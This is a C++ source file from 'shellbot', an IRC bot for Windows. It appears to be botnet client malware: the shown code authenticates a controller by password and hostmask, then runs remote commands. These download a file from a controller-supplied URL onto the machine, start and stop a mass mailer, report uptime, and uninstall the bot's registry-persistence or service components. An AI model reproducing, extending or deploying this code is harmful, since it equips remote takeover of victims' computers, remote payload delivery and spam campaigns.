/*	shellbot - a high performance IRC bot for Win32
	Copyright (C) 2005 Shellz

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "vInclude.h"
#include "vPOEb.h"
#include "vExterns.h"
//#include "vCmdList.h"

void CMain::Auth(vector <string> iBuffer) 
{
	if (iBuffer[4].compare(vPOEb->vIRC.cConf.vBotPass) == 0 && CheckUser(iBuffer[0])) {
		bool bSilent = false;
		//! Check to see if -s option is provided
		if (iBuffer.size() > 5) {
			if (iBuffer[5] == "-s")
				bSilent = true;	}
		sLogin = true;
		if (!bSilent)
			vPOEb->vIRC.SendData("PRIVMSG %s :Accepted.\r\n",vPOEb->vIRC.msgTo.c_str()); 
	}

}

bool CMain::CheckUser(string sUser)
{
	if (wildcmp(vPOEb->vIRC.cConf.vMasterPattern.c_str(),sUser.c_str()))return true;
	return false;	
}
void CMain::ExecuteCmd(vector <string> iBuffer, int p, string cmd)
{
#ifdef DEBUG_MODE
	vPOEb->DebugPrint("debug",con::fg_blue,"Parsing command (%s).",cmd.c_str());
#endif // DEBUGMODE
	if (cmd == main_disc[0] || cmd == main_disc[1]){
		vPOEb->vIRC.IRCRunning = false;
		vPOEb->botRunning = false;
	}
	else if (cmd == main_rec[0] || cmd == main_rec[1]){
		vPOEb->vIRC.IRCRunning = false;
	} 
	else if (cmd == main_up[0] || cmd == main_up[1]){
		vPOEb->vIRC.SendData("PRIVMSG %s :%s\r\n",vPOEb->vIRC.msgTo.c_str(), SystemUptime());
	}
	else if (cmd == main_dl[0] || cmd == main_dl[1] && iBuffer.size() - p > 3) {
		vPOEb->vDownload.sUrl = iBuffer[p+1];
		vPOEb->vDownload.sDest = iBuffer[p+2];
		vPOEb->vDownload.sUpdate = iBuffer[p+3];
		CreateThread(NULL, 0, (unsigned long (__stdcall *)(void *))&Download, NULL, 0, 0);
	}
	else if (cmd == main_msa[0] || cmd == main_msa[1]) {
/*		if(vPOEb->cmail.Start(true))
			vPOEb->vIRC.SendData("PRIVMSG %s :Mailer started.\r\n",vPOEb->vIRC.msgTo.c_str());
		else
			vPOEb->vIRC.SendData("PRIVMSG %s :ERROR: mailer not started.\r\n",vPOEb->vIRC.msgTo.c_str());
//		vPOEb->cmail.m_mRunning = true;*/
		vPOEb->cmail.Run();
	}
	else if (cmd == main_mso[0] || cmd == main_mso[1]) {
//		if(vPOEb->cmail.CleanupPThreads())
			vPOEb->cmail.CleanupPThreads();
			vPOEb->vIRC.SendData("PRIVMSG %s :Mailer stopped.\r\n",vPOEb->vIRC.msgTo.c_str());
//		else
//			vPOEb->vIRC.SendData("PRIVMSG %s :ERROR: mailer not stopped.\r\n",vPOEb->vIRC.msgTo.c_str());
//		vPOEb->cmail.m_mRunning = false;
	}
	else if (cmd == main_rm[0] || cmd == main_rm[1]) {
#ifndef SERVICE
		vPOEb->vRegcheck.Kill();	
		vPOEb->vRegcheck.Uninstall();
		vPOEb->botRunning = false;
#else
		vPOEb->botRunning = false;
		UninstallSvc(vPOEb->vIRC.cConf.vSvcName.c_str());
#endif
	}			
}
 